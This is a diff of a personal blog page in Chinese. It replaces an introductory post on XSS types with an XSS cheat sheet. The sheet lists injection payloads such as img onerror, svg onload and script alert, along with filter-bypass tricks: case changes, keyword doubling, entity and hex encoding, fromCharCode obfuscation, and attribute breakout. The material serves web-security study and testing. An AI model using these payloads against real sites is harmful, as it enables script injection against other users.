@@ -87,46 +87,37 @@
 
 
 
-<meta name="description" content="#XSS注入基础知识#
+<meta name="description" content="title:XSS总结1.常用XSS注入标签
+`&amp;lt;img onerror=&amp;quot;alert(document.domain)&amp;quot; src=&amp;gt;
 
-xss攻击是什么?
+&amp;lt;a href = javascript:alert(document.domain)&amp;gt;
 
-   代码注入形式的一种安全漏洞攻击
-   通过注入恶意指令代码到网页，是用户执行攻击者所制造的恶意网页
-   攻击成功后，攻击者可能得到更高的用户权限
+&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;
 
-xss攻击的基本原理
-
- 在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进">
+javascrip">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss注入的基础知识">
-<meta property="og:url" content="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/02/14/xss注入基本知识/index.html">
+<meta property="og:title" content="TobeFine">
+<meta property="og:url" content="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/05/27/XSS总结/index.html">
 <meta property="og:site_name" content="TobeFine">
-<meta property="og:description" content="#XSS注入基础知识#
+<meta property="og:description" content="title:XSS总结1.常用XSS注入标签
+`&amp;lt;img onerror=&amp;quot;alert(document.domain)&amp;quot; src=&amp;gt;
 
-xss攻击是什么?
+&amp;lt;a href = javascript:alert(document.domain)&amp;gt;
 
-   代码注入形式的一种安全漏洞攻击
-   通过注入恶意指令代码到网页，是用户执行攻击者所制造的恶意网页
-   攻击成功后，攻击者可能得到更高的用户权限
+&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;
 
-xss攻击的基本原理
-
- 在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进">
-<meta property="og:updated_time" content="2017-02-14T14:17:27.878Z">
+javascrip">
+<meta property="og:updated_time" content="2017-06-02T10:47:09.954Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xss注入的基础知识">
-<meta name="twitter:description" content="#XSS注入基础知识#
+<meta name="twitter:title" content="TobeFine">
+<meta name="twitter:description" content="title:XSS总结1.常用XSS注入标签
+`&amp;lt;img onerror=&amp;quot;alert(document.domain)&amp;quot; src=&amp;gt;
 
-xss攻击是什么?
+&amp;lt;a href = javascript:alert(document.domain)&amp;gt;
 
-   代码注入形式的一种安全漏洞攻击
-   通过注入恶意指令代码到网页，是用户执行攻击者所制造的恶意网页
-   攻击成功后，攻击者可能得到更高的用户权限
+&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;
 
-xss攻击的基本原理
-
- 在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进">
+javascrip">
 
 
 
@@ -154,13 +145,13 @@ xss攻击的基本原理
 
 
 
-  <link rel="canonical" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/02/14/xss注入基本知识/"/>
+  <link rel="canonical" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/05/27/XSS总结/"/>
 
 
 
 
 
-  <title> xss注入的基础知识 | TobeFine </title>
+  <title>  | TobeFine </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -325,7 +316,7 @@ xss攻击的基本原理
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/02/14/xss注入基本知识/">
+  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/05/27/XSS总结/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="Shirley">
@@ -349,7 +340,7 @@ xss攻击的基本原理
             
             
               
-                xss注入的基础知识
+                
               
             
           </h1>
@@ -364,8 +355,8 @@ xss攻击的基本原理
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Дата создания записи" itemprop="dateCreated datePublished" datetime="2017-02-14T22:18:15+08:00">
-                2017-02-14
+              <time title="Дата создания записи" itemprop="dateCreated datePublished" datetime="2017-05-27T16:19:08+08:00">
+                2017-05-27
               </time>
             
 
@@ -383,8 +374,8 @@ xss攻击的基本原理
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/02/14/xss注入基本知识/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/14/xss注入基本知识/" itemprop="commentCount"></span>
+                <a href="/2017/05/27/XSS总结/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/05/27/XSS总结/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -410,31 +401,59 @@ xss攻击的基本原理
       
 
       
-        <p>#XSS注入基础知识#</p>
+        <hr>
+<h2 id="title-XSS总结"><a href="#title-XSS总结" class="headerlink" title="title:XSS总结"></a>title:XSS总结</h2><p>1.常用XSS注入标签</p>
+<pre><code>`&lt;img onerror=&quot;alert(document.domain)&quot; src=&gt;
+
+&lt;a href = javascript:alert(document.domain)&gt;
+
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+javascript:alert(document.domain)
+
+onclick = alert(document.domain)
+
+onmouseover = alert(document.domain) /onfocus
+
+&lt;svg/onload = alert(document.domain)&gt;`
+</code></pre><p>2.过滤字符常见的处理方法：<br>a.中间再插入1个相同的字符<br>[例如：<br>     <code>1.过滤了script → scrSCRIPTipt</code><br>]</p>
+<p>b.改换大小写<br>[例如：<br>     <code>1.过滤了script → scriPt</code><br>]</p>
+<p>c.将其中一个数字改成Unicode编码<br>[例如:<br>    <code>1.过滤script → sc&amp;#114;ipt</code><br>]</p>
+<p>d.加注释符绕过<br>[例如：<br>    <code>1.expression → expre/**/ssion</code><br>]</p>
+<p>e.转换为16进制编码<br>[例如：<br>    <code>1.script → sc%52ipt</code><br>]</p>
+<p>f:全部转换为Unicode编码<br>[例如：<br>     1.过滤了alert<br> <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+ http://tool.chinaz.com/tools/unicode.aspx
+ &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,10))&lt;/script&gt;</code><br>]</p>
+<p>4.常见的xss注入点<br>     通过GET方法：（在URL中输入的参数显示在HTML中）<br>a.在<code>&lt;b&gt;</code>或者<code>&lt;p&gt;</code>中</p>
+<pre><code>`&lt;img onerror=&quot;alert(document.domain);&quot; src=&gt;
+
+ &lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+ &lt;a href=javascript:alert(document.domain)&gt;`
+</code></pre><p>b.在<code>&lt;input&gt;</code>标签里面<br>     ①逃出&lt; &gt;<br>    例如:</p>
+<pre><code>原句：&lt;input name=&quot;t1&quot; value=&quot;&quot; type=&quot;text&quot;&gt;
+变为：&lt;input name=&quot;t1&quot; value=&quot;&quot; type=&quot;text&quot;&gt;&lt;img onerror=&quot;alert(document.domain);&quot;src=&gt;&quot; type=&quot;text&quot;&gt;
+</code></pre><p> ②如果无法逃出value=””里的双引号<br>     a.查看是否有hidden标签，如有：<br><br>          a1.看看在url中可不可以用GET方法修改hidden 标签的值<br>          a2:用burp抓包，再修改值<br><br>     b.利用特殊符号吃掉双引号（%A7） 宽字节注入<br><br>     c.使用onclick onmouseover onfocus<br><br>③有字数限制<br>      用burp修改<br><br>④转义了&lt;&gt;<br>      可以用onclick在input中触发，使用onclick onmouseover</p>
+<p>c.类似于评论区的，可以提交自己的信息的<br><br> ①若没有过滤<img标签><br><br> 在<img>标签中插入onload事件，（自己创建一个可以放入xss的地方）  </img标签></p>
+<pre><code>&lt;img src=&quot;&quot; onerror=&quot;alert(&apos;xss&apos;)&quot;&gt;
+</code></pre><p>d.若页面转换照片通过url后面的参数来转换</p>
+<p>e.使用了字母大小写的转换：<br></p>
 <blockquote>
-<p>xss攻击是什么?</p>
+<ul>
+<li>toLocaleUpperCase 将字符串中所有的字母字符都将被转换为大写的，同时适应宿主环境的当前区域设置。</li>
+</ul>
+<ul>
+<li>toUpperCase 将字符串中的所有字母都被转化为大写字母。</li>
+</ul>
+<ul>
+<li>toLocaleLowerCase 将字符串所有的字母字符都被转换为小写，同时考虑到宿主环境的当前区域设置。</li>
+</ul>
+<ul>
+<li>toLowerCase 将字符串中的字母被转换为小写字母。</li>
+</ul>
 </blockquote>
-<p>   代码注入形式的一种安全漏洞攻击</p>
-<p>   通过注入恶意指令代码到网页，是用户执行攻击者所制造的恶意网页</p>
-<p>   攻击成功后，攻击者可能得到更高的用户权限</p>
-<blockquote>
-<p>xss攻击的基本原理</p>
-</blockquote>
-<p> 在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击——将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。</p>
-<blockquote>
-<p>xss的基本实现思路</p>
-</blockquote>
-<p>通过在网页上发布评论，提交还有类似于JS或者html或者Java，VBScript，ActiveX，Flash的内容文本。时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。</p>
-<blockquote>
-<p>xss的类型</p>
-</blockquote>
-<pre><code>反射性xss  --被动的非持久性xss
-</code></pre><p>通过点击带有攻击性的url链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。</p>
-<pre><code>持久型xss
-</code></pre><p>主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。可以描述为:恶意用户的HTML或JS输入服务器-&gt;进入数据库-&gt;服务器响应时查询数据库-&gt;用户浏览器。</p>
-<pre><code>DOM-based XSS
-</code></pre><p>基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击。<br>注：domxss取决于输出位置，并不取决于输出环境，因此domxss既有可能是反射型的，也有可能是存储型的。dom-based与非dom-based，反射和存储是两个不同的分类标准。</p>
-<p> <strong>转载自<a href="http://www.imooc.com/m/wap/article/detail.html?aid=13553" target="_blank" rel="external">http://www.imooc.com/m/wap/article/detail.html?aid=13553</a> 对于跨站脚本攻击（XSS攻击）的理解和总结</strong> </p>
+<p>toUpperCase():<br><br> ı ==&gt;I<br><br> ſ ==&gt;S<br></p>
+<p> toLowerCase():<br><br> İ ==&gt;i<br><br> K ==&gt;k<br></p>
 
       
     </div>
@@ -465,8 +484,8 @@ xss攻击的基本原理
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/02/12/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2017/03/04/python爬虫的一些小知识点/" rel="next" title="python爬虫的一些小知识点">
+                <i class="fa fa-chevron-left"></i> python爬虫的一些小知识点
               </a>
             
           </div>
@@ -474,10 +493,6 @@ xss攻击的基本原理
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/02/15/xss试验/" rel="prev" title="xss攻击类型和方式">
-                xss攻击类型和方式 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -519,8 +534,8 @@ xss攻击的基本原理
 			})();
 			</script>
 		<!-- 多说公共JS代码 end -->
-      <div class="ds-thread" data-thread-key="2017/02/14/xss注入基本知识/"
-           data-title="xss注入的基础知识" data-url="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/02/14/xss注入基本知识/">
+      <div class="ds-thread" data-thread-key="2017/05/27/XSS总结/"
+           data-title="" data-url="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/05/27/XSS总结/">
       </div>
     
   </div>
@@ -544,8 +559,17 @@ xss攻击的基本原理
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/myslef.jpg"
@@ -587,6 +611,22 @@ xss攻击的基本原理
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#title-XSS总结"><span class="nav-number">1.</span> <span class="nav-text">title:XSS总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
     </div>
